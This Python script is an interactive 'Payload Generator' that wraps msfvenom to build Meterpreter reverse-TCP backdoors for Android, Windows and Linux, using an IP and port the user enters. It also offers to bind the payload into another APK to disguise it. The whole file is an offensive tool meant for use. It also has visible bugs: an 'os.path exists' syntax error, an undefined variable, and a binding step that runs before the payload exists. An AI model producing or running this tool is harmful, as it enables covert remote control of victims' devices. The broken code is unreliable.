import os
import logging
import subprocess
import sys
import time
import socket
from pyfiglet import Figlet

# Constants for text formatting
BOLD = "\033[1m"
LARGE = "\033[4m"
RESET = "\033[0m"

# Create a custom Figlet font
custom_figlet = Figlet(font="block")

# Set up the logging system
logging.basicConfig(filename="payload_generator.log", level=logging.INFO, format="%(asctime)s - %(levelname)s: %(message)s")
log = logging.getLogger("payload_generator")

# Function to create the "Payloads" folder if it doesn't exist
def create_payloads_folder():
    if not os.path exists("Payloads"):
        os.makedirs("Payloads")

# Function to execute a command and capture the output
def execute_command(command, verbose=False):
    try:
        if verbose:
            print(f"Executing command: {command}")
        result = subprocess.run(command, shell=True, text=True, capture_output=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        error_message = f"Error executing command: {e.stderr}"
        log.error(error_message)
        return error_message

# Function to generate payloads
def generate_payload(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, custom_filename=None, verbose=False):
    try:
        if not ip or not port:
            raise ValueError("IP address and port are required.")
        
        # Check if the IP is a valid IPv4 address
        try:
            socket.inet_aton(ip)
        except socket.error:
            raise ValueError("Invalid IP address. Please provide a valid IPv4 address.")

        # Check if the port is a valid integer in the range [1, 65535]
        try:
            port = int(port)
            if not (1 <= port <= 65535):
                raise ValueError("Port number is out of range.")
        except ValueError:
            raise ValueError("Invalid port number. Please provide a valid integer in the range [1, 65535].")

        if payload_type not in ["android", "windows", "linux"]:
            raise ValueError("Unsupported payload type.")

        if payload_type == "android":
            if custom_filename and not custom_filename.endswith(".apk"):
                raise ValueError("Invalid custom filename. Android payloads must have an '.apk' extension.")

            if custom_filename:
                output_file = f"Payloads/{custom_filename}"
            else:
                output_file = f"Payloads/payload.apk"

            payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} --platform android -a dalvik"

        elif payload_type == "windows":
            if custom_filename and not custom_filename.endswith(".exe"):
                raise ValueError("Invalid custom filename. Windows payloads must have an '.exe' extension.")

            if custom_filename:
                output_file = f"Payloads/{custom_filename}"
            else:
                output_file = f"Payloads/payload.exe"

            payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"

        elif payload_type == "linux":
            if custom_filename and not custom_filename.endswith(".elf"):
                raise ValueError("Invalid custom filename. Linux payloads must have an '.elf' extension.")

            if custom_filename:
                output_file = f"Payloads/{custom_filename}"
            else:
                output_file = f"Payloads/payload.elf"

            payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"

        create_payloads_folder()

        if bind:
            if not bind_file:
                raise ValueError("Binding file path is required.")
            
            if payload_type == "android":
                if custom_filename and not custom_filename.endswith(".apk"):
                    raise ValueError("Invalid custom filename. Android payloads must have an '.apk' extension.")

                if custom_filename:
                    output_file = f"Payloads/{custom_filename}"
                else:
                    output_file = f"Payloads/bind_payload.apk"

                binding_command = f"apktool b {output_file} -o {output_file} -f {bind_file}"
                bind_output = execute_command(binding_command, verbose)
                if "Exception" in bind_output:
                    raise Exception(f"Binding failed: {bind_output}")
            else:
                raise ValueError("Binding is not supported for non-Android payloads.")

        payload_output = execute_command(payload_command, verbose)
        if "Exception" in payload_output:
            raise Exception(f"Payload generation failed: {payload_output}")

        success_message = f"{payload_type.capitalize()} payload generated successfully as '{output_file}'{' (and bound)' if bind else ''}"
        log.info(success_message)
        return success_message
    except Exception as e:
        log.error(str(e))
        return str(e)

if __name__ == "__main__":
    verbose = False  # Set this to False to suppress the animation and command execution messages

    # Background color codes
    BG_YELLOW = "\033[43m"
    BG_RESET = "\033[0m"

    print("\033[93m")
    print(custom_figlet.renderText("Payload Generator"))
    print("\033[0m")

    # Ask for IP address and port with colored background
    ip = input(f"{BG_YELLOW}{BOLD}{LARGE}Enter your IP address: {RESET}")
    port = input(f"{BG_YELLOW}{BOLD}{LARGE}Enter the port: {RESET}")

    print("\033[96m")
    print("Select payload type:")
    print("1. Android")
    print("2. Windows")
    print("3. Linux")
    print("\033[0m")
    choice = input(f"{BG_YELLOW}{BOLD}{LARGE}Enter the number of your choice: {RESET}")

    if choice == "1":
        payload_type = "android"
    elif choice == "2":
        payload_type = "windows"
    elif choice == "3":
        payload_type = "linux"
    else:
        print("\033[91m")
        print("Invalid choice. Please choose a valid payload type.")
        print("\033[0m")
        exit()

    custom_filename = input(f"{BG_YELLOW}{BOLD}{LARGE}Enter a custom filename (leave empty to use default naming): {RESET}").strip()

    bind = input(f"{BG_YELLOW}{BOLD}{LARGE}Do you want to bind payloads? (yes or no): {RESET}").strip().lower() == "yes"
    bind_file = input(f"{BG_YELLOW}{BOLD}{LARGE}Enter the path to the file you want to bind (leave empty if not binding): {RESET}").strip()

    result = generate_payload(ip, port, payload_type, android_api_level, bind, bind_file, custom_filename, verbose=verbose)
    print("\033[92m")
    print(result)
    print("\033[0m")
